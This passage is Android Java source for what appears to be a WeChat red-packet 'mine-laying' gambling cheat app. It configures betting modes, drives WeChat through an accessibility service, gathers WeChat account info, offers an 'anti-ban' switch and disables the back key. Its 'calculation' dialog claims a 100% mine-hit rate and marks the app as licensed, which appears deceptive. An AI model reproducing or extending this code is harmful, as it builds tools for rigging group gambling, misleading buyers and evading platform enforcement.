    	 //设置单雷三雷双雷
       	rgSayThunderNum.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //获取变更后的选中项的ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //根据ID获取RadioButton的实例
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //更新文本内容，以符合选中项
                   String sChecked=rb.getText().toString();
                   String say="";
                   //tv.setText("您的性别是：" + rb.getText());
                  if(sChecked.equals("单雷")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_SINGLE_THUNDER;
                	  say="当前设置：单雷。";
                  }
                  if(sChecked.equals("双雷")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_DOUBLE_THUNDER;
                	  say="当前设置：双雷。";
                  }
                  if(sChecked.equals("三雷")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_THREE_THUNDER;
                	  say="当前设置：三雷。";
                  }
                  if(sChecked.equals("四雷")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_FOUR_THUNDER;
                	  say="当前设置：四雷。";
                  }
                  if(sChecked.equals("五雷")){
                	  Config.iMoneySayThunderNum=Config.KEY_MONEY_SAY_FIVE_THUNDER;
                	  say="当前设置：五雷。";
                  }
              	getConfig().setMoneySayThunderNum(Config.iMoneySayThunderNum);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
        //选择埋雷玩法
       	rgSelPutThunderPlaying.setOnCheckedChangeListener(new OnCheckedChangeListener() {
               @Override
               public void onCheckedChanged(RadioGroup arg0, int arg1) {
                   // TODO Auto-generated method stub
                   //获取变更后的选中项的ID
                  int radioButtonId = arg0.getCheckedRadioButtonId();
                  //根据ID获取RadioButton的实例
                   RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                   //更新文本内容，以符合选中项
                   String sChecked=rb.getText().toString();
                   String say="";
                   //tv.setText("您的性别是：" + rb.getText());
                  if(sChecked.equals("普通群玩法")){
                	  Config.iPlaying=Config.KEY_PUT_THUNDER_COMMON_PLAYING;
                	  say="当前选择：普通群玩法。";
                	  //etLuckyMoneyNum.setEnabled(true);
                  }
                  if(sChecked.equals("碰碰群玩法")){
                	  Config.iPlaying=Config.KEY_PUT_THUNDER_BUMP_PLAYING;
                	  say="当前选择：碰碰群玩法。";
                	  etLuckyMoneyNum.setText("5");
                	  rbSingleThunder.setChecked(true);
                	  //etLuckyMoneyNum.setEnabled(false);
                  }

              	getConfig().setPutThunderPlaying(Config.iPlaying);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
              }
           });
        //发音 模式
    	rgSelSoundMode.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup arg0, int arg1) {
                // TODO Auto-generated method stub
                //获取变更后的选中项的ID
               int radioButtonId = arg0.getCheckedRadioButtonId();
               //根据ID获取RadioButton的实例
                RadioButton rb = (RadioButton)MainActivity.this.findViewById(radioButtonId);
                //更新文本内容，以符合选中项
                String sChecked=rb.getText().toString();
                String say="";
               if(sChecked.equals("关闭语音提示")){
            	   Config.bSpeaking=Config.KEY_NOT_SPEAKING;
               		say="当前设置：关闭语音提示。";
               }
               if(sChecked.equals("女声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_FEMALE;
               		say="当前设置：女声提示。";
               }
               if(sChecked.equals("男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_MALE;
               		say="当前设置：男声提示。";
               }
               if(sChecked.equals("特别男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_SPECIAL_MALE;
               		say="当前设置：特别男声提示。";
               }
               if(sChecked.equals("情感男声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_EMOTION_MALE;
               		say="当前设置：情感男声提示。";
               }
               if(sChecked.equals("情感儿童声")){
            	   Config.bSpeaking=Config.KEY_SPEAKING;
            	   Config.speaker=Config.KEY_SPEAKER_CHILDREN;
               		say="当前设置：情感儿童声提示。";
               }
        	   speaker.setSpeaking(Config.bSpeaking);
        	   speaker.setSpeaker(Config.speaker);
          		getConfig().setWhetherSpeaking(Config.bSpeaking);
          		getConfig().setSpeaker(Config.speaker);
              	speaker.speak(say);
              	Toast.makeText(MainActivity.this,say, Toast.LENGTH_LONG).show();
           }
        });
   	//
    }
    @SuppressWarnings("deprecation")
	private void getResolution2(){
        WindowManager windowManager = getWindowManager();    
        Display display = windowManager.getDefaultDisplay();    
        Config.screenWidth= display.getWidth();    
        Config.screenHeight= display.getHeight();  
        Config.currentapiVersion=android.os.Build.VERSION.SDK_INT;
    }
    private void getResolution(){
    	  DisplayMetrics dm = new DisplayMetrics();  
          getWindowManager().getDefaultDisplay().getMetrics(dm);   
          Config.screenWidth=(int)(dm.widthPixels*dm.density/2);   
          Config.screenHeight=(int)(dm.heightPixels*dm.density/2);  
          Config.currentapiVersion=android.os.Build.VERSION.SDK_INT;
    }
    public void setMyTitle(){
        if(ConfigCt.version.equals("")){
      	  try {
      		  PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
      		ConfigCt.version =  info.versionName;
      	  } catch (PackageManager.NameNotFoundException e) {
      		  e.printStackTrace();
            
      	  }
        }
        if(Config.bReg){
      	  setTitle(getString(R.string.app_name) +  " v" + ConfigCt.version+"（正式版）");
        }else{
      	  setTitle(getString(R.string.app_name) +  " v" + ConfigCt.version+"（试用版）");
        }
    }
    /**显示版本信息*/
    public void showVerInfo(boolean bReg){
    	ConfigCt.bReg=bReg;
    	if(Ad2.currentQQ!=null)Ad2.currentQQ.getADinterval();
		if(Ad2.currentWX!=null)Ad2.currentWX.getADinterval();
        if(bReg){
        	Config.bReg=true;
        	getConfig().setREG(true);
        	tvRegState.setText("授权状态：已授权");
        	tvRegWarm.setText("破解版不出雷，正版升级技术售后联系"+ConfigCt.contact);
        	etRegCode.setVisibility(View.INVISIBLE);
        	tvPlease.setVisibility(View.INVISIBLE);
        	btReg.setVisibility(View.INVISIBLE);
        	speaker.speak("欢迎使用微信埋雷专家！您是正版用户！" );
        	
        }else{
        	Config.bReg=false;
        	getConfig().setREG(false);
        	tvRegState.setText("授权状态：未授权");
        	tvRegWarm.setText(ConfigCt.warning+"技术及授权联系"+ConfigCt.contact);
        	etRegCode.setVisibility(View.VISIBLE);
        	tvPlease.setVisibility(View.VISIBLE);
        	btReg.setVisibility(View.VISIBLE);
        	speaker.speak("欢迎使用微信埋雷专家！您是试用版用户！" );
        	
        }
        String html = "<font color=\"blue\">官方网站下载地址(点击链接打开)：</font><br>";
        html+= "<a target=\"_blank\" href=\""+ConfigCt.homepage+"\"><font color=\"#FF0000\"><big><b>"+ConfigCt.homepage+"</b></big></font></a>";
        //html+= "<a target=\"_blank\" href=\"http://119.23.68.205/android/android.htm\"><font color=\"#0000FF\"><big><i>http://119.23.68.205/android/android.htm</i></big></font></a>";
        tvHomePage.setTextColor(Color.BLUE);
        tvHomePage.setBackgroundColor(Color.WHITE);//
        //tvHomePage.setTextSize(20);
        tvHomePage.setText(Html.fromHtml(html));
        tvHomePage.setMovementMethod(LinkMovementMethod.getInstance());
        setMyTitle();
        updateMeWarning(ConfigCt.version,ConfigCt.new_version);//软件更新提醒
    }
    /**  软件更新提醒*/
    private void updateMeWarning(String version,String new_version){
 	   try{
 		   float f1=Float.parseFloat(version);
 		   float f2=Float.parseFloat(new_version);
 	   if(f2>f1){
 		   showUpdateDialog();
 	   }
 	   } catch (Exception e) {  
            e.printStackTrace();  
            return;  
        }  
    }
    /** 置为试用版*/
    public void setAppToTestVersion() {
    	String sStartTestTime=getConfig().getStartTestTime();//取自动置为试用版的开始时间；
    	SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.US);//yyyy-MM-dd_HH-mm-ss
    	String currentDate =sdf.format(new Date());//取当前时间；
    	int timeInterval=getConfig().getDateInterval(sStartTestTime,currentDate);//得到时间间隔；
    	if(timeInterval>Config.TestTimeInterval){//7天后置为试用版：
    		showVerInfo(false);
    		//ftp.getFtp().DownloadStart();//下载服务器信息;
    	}
    }
    private   void   showUpdateDialog(){ 
        /* @setIcon 设置对话框图标 
         * @setTitle 设置对话框标题 
         * @setMessage 设置对话框消息提示 
         * setXXX方法返回Dialog对象，因此可以链式设置属性 
         */ 
        final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
        normalDialog.setIcon(R.drawable.ic_launcher); 
        normalDialog.setTitle(  "升级提醒"  );
        normalDialog.setMessage("有新版软件，是否现在升级？"); 
        normalDialog.setPositiveButton("确定",new DialogInterface.OnClickListener(){
            @Override 
            public void onClick(DialogInterface dialog,int which){ 
                //...To-do
     		   Uri uri = Uri.parse(ConfigCt.download);    
     		   Intent it = new Intent(Intent.ACTION_VIEW, uri);    
     		   startActivity(it);  
            }
        }); 
        normalDialog.setNegativeButton("关闭",new DialogInterface.OnClickListener(){ 
            @Override 
            public void onClick(DialogInterface dialog,   int   which){ 
            //...To-do 
            } 
        }); 
        // 显示 
        normalDialog.show(); 
    } 
    private   void   showCalcDialog(){ 
        /* @setIcon 设置对话框图标 
         * @setTitle 设置对话框标题 
         * @setMessage 设置对话框消息提示 
         * setXXX方法返回Dialog对象，因此可以链式设置属性 
         */ 
        final AlertDialog.Builder normalDialog=new  AlertDialog.Builder(MainActivity.this); 
        normalDialog.setIcon(R.drawable.ic_launcher); 
        normalDialog.setTitle(  "计算埋雷数据提醒"  );
        normalDialog.setMessage(ConfigCt.AppName+"需要计算埋雷数据，以使埋雷更加精准！此计算需要很长时间，请于晚上睡觉前运行计算任务！！运行计算任务时不要锁屏！手机处于充电状态！以免计算失败！"); 
        normalDialog.setPositiveButton("确定",new DialogInterface.OnClickListener(){
            @Override 
            public void onClick(DialogInterface dialog,int which){ 
            	if(!QiangHongBaoService.isRunning()) {
    				String say="请先找到"+ConfigCt.AppName+"，然后打开埋雷服务，才能计算埋雷数据！";
    				Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
    				speaker.speak(say);
    				QiangHongBaoService.startSetting(getApplicationContext());
    				return;
    			}
    			if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
    				if(!FloatWindowManager.getInstance().applyOrShowFloatWindow(MainActivity.this))return;
    			}
    			CalcShow.getInstance(getApplicationContext()).showPic();
    			CalcShow.getInstance(getApplicationContext()).showTxt();
            }
        }); 
        normalDialog.setNegativeButton("关闭",new DialogInterface.OnClickListener(){ 
            @Override 
            public void onClick(DialogInterface dialog,   int   which){ 
            //...To-do 
            } 
        }); 
        // 显示 
        normalDialog.show(); 
    } 
    /*
     * 添加联系人对话框
     * */
    private   void   showAddContactsDialog(){ 
        /* @setIcon 设置对话框图标 
         * @setTitle 设置对话框标题 
         * @setMessage 设置对话框消息提示 
         * setXXX方法返回Dialog对象，因此可以链式设置属性 
         */ 
 	   AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        //builder.setIcon(R.drawable.ic_launcher);
        builder.setIcon(ResourceUtil.getDimenId(getApplicationContext(), "ic_launcher"));
        builder.setTitle("请联系客服，激活软件");
        String say="请联系客服，激活软件!包包雷！";
    	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
 	    speaker.speak(say);
        //builder.setMessage(say);
        final Contacts  cs=Contacts.getInstance(getApplicationContext(),ConfigCt.contact);
        String k1="客服1(QQ："+cs.QQ+")";
        String k2="客服2(微信："+cs.wx+")";
        final String[] css = {k1,k2};
        //    设置一个单项选择下拉框
        /**
         * 第一个参数指定我们要显示的一组下拉单选框的数据集合
         * 第二个参数代表索引，指定默认哪一个单选框被勾选上，1表示默认'女' 会被勾选上
         * 第三个参数给每一个单选项绑定一个监听器
         */
        builder.setSingleChoiceItems(css, 0, new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	   if(which==0){
         		   cs.openQQadd();
         	   }
         	   if(which==1){
         		   cs.openWXadd();
         	   }
                //Toast.makeText(MainActivity.this, "性别为：" + sex[which], Toast.LENGTH_SHORT).show();
            }
        });
        builder.setPositiveButton("确定", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	   if(which==0||which==-1){
         		   cs.openQQadd();
         	   }
         	   if(which==1){
         		   cs.openWXadd();
         	   }
            }
        });
        builder.setNegativeButton("试用", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
            	Log.d(TAG, "事件---->打开微信");
				OpenWechat();
				speaker.speak("启动微信。埋雷开始。");
				//sendPwd();
				String wxInfo=ConfigCt.getInstance(MainActivity.this).getWechatInfo();
				if(wxInfo.length()==0){
					//WechatInfo.start();
					if(WechatInfo.getWechatInfo().isEnable()){
						WechatInfo.getWechatInfo().start();
					}
				}
				finish();
            }
        });
        builder.show();
    }
    /*
     * (non-Javadoc)
     * @see android.widget.CompoundButton.OnCheckedChangeListener#onCheckedChanged(android.widget.CompoundButton, boolean)
     */
    @Override
    public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
    	String sShow="";
        switch (compoundButton.getId()){

            case R.id.swGuardAccount:
                if(compoundButton.isChecked()){
                	if(Config.bReg)
                		sShow="打开防封号功能";
                	else{
                		compoundButton.setChecked(false);
                		sShow="必须授权后才能打开防封号开关";
                	}
                }
                else sShow="关闭防封号功能";
                break;
        }
        Toast.makeText(this,sShow,Toast.LENGTH_SHORT).show();
        speaker.speak(sShow);
    }
    @Override
    public void onBackPressed() {
        //此处写退向后台的处理
 	   //moveTaskToBack(true); 
    }
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {//如果返回键按下
            //此处写退向后台的处理
     	   //moveTaskToBack(true);
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    @Override
    protected void onStop() {
        // TODO Auto-generated method stub
        super.onStop();
        //mainActivity=null;
        finish();
    }
    @Override
    protected void onDestroy() {
    	super.onDestroy();
    	unregisterReceiver(qhbConnectReceiver);
    	mBackgroundMusic.stopBackgroundMusic();
        
    }
    @Override
    protected void onResume() {
        // TODO Auto-generated method stub
        super.onResume();
        //if(!Utils.isActive)
        //{
            //Utils.isActive = true;
            /*一些处理，如弹出密码输入界面*/
        //}
    }
	@Override
	protected void onNewIntent(Intent intent) {
	    super.onNewIntent(intent);
	    setIntent(intent);//must store the new intent unless getIntent() will return the old one
	    //startAllServices();
		Log.i(Config.TAG, "aa onNewIntent: 调用");  
	}
	  /*
     * 计算成功对话框
     * */
    private   void   showCalcSucDialog(){ 
        /* @setIcon 设置对话框图标 
         * @setTitle 设置对话框标题 
         * @setMessage 设置对话框消息提示 
         * setXXX方法返回Dialog对象，因此可以链式设置属性 
         */ 
    	showVerInfo(true);
 	   AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        //builder.setIcon(R.drawable.ic_launcher);
        builder.setIcon(ResourceUtil.getDimenId(getApplicationContext(), "ic_launcher"));
        builder.setTitle("埋雷数据计算成功提醒");
        String say="埋雷数据已计算成功！出雷率达到100%";
    	Toast.makeText(MainActivity.this, say, Toast.LENGTH_LONG).show();
 	    speaker.speak(say);
        builder.setMessage(say);
     
        builder.setPositiveButton("确定", new DialogInterface.OnClickListener()
        {
            @Override
            public void onClick(DialogInterface dialog, int which)
            {
         	  
            }
        });
    
        builder.show();
    }
    /** 
	  * 开启所有Service 
	   
	 private void startAllServices()  
	 {  
		 if(AppUtils.isServiceRunning(this, this.getPackageName().toString(),OrderService.class.getName()))return;
		 	//启动下载服务：
	        Intent intent=new Intent(this,DownloadService.class);
	        startService(intent);
	        //启动锁屏服务：
	        Intent intentLock=new Intent(this,LockService.class);
	        startService(intentLock);
	      
	     startService(new Intent(this, OrderService.class));  
	     startService(new Intent(this, GuardService.class));  
	     if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.LOLLIPOP) {  
	         Log.d("byc001", "startAllServices: ");  
	         //版本必须大于5.0  
	         startService(new Intent(this, JobWakeUpService.class));  
	     }  
	 }
	  */ 
}
